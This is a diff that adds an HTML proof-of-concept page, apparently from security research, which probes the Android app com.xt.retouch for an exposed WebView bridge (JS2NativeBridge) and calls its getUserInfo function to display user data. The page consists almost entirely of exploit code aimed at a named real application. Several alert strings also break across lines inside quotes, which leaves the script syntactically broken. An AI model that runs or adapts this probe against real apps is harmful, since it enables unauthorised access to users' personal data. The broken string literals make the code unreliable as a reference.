@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>JSBridge Reachability PoC</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #121212; color: #00ff00; }
+        button { padding: 15px; background: #333; color: white; border: 1px solid #00ff00; width: 100%; font-size: 16px; margin-top: 20px;}
+    </style>
+</head>
+<body>
+    <h2>Interface Object: window.JS2NativeBridge</h2>
+    <p>Target App: com.xt.retouch</p>
+    
+    <button onclick="testBridge()">Execute JSBridge.callSync()</button>
+
+    <script>
+        function testBridge() {
+            try {
+                // 1. Verify the interface was injected successfully
+                if (window.JS2NativeBridge) {
+                    
+                    // 2. Construct the JSON payload required by JavaScriptInterfaceModule.smali
+                    // Using 'getUserInfo' as the target function based on the WebActivity$JsTaskCallback discovered in the NERVE report.
+                    let payload = JSON.stringify({ 
+                        func: "getUserInfo", 
+                        params: {} 
+                    });
+                    
+                    // 3. Make the synchronous call to the Java method
+                    let result = window.JS2NativeBridge.callSync("getUserInfo", payload);
+                    
+                    // 4. Return the result to the screen
+                    alert("Bridge Execution Successful!
+
+Returned Data:
+" + result);
+                    
+                } else {
+                    alert("Failure: JS2NativeBridge object is not exposed in this WebView context.");
+                }
+            } catch (err) {
+                alert("Execution Error: 
+" + err.message);
+            }
+        }
+    </script>
+</body>
+</html>
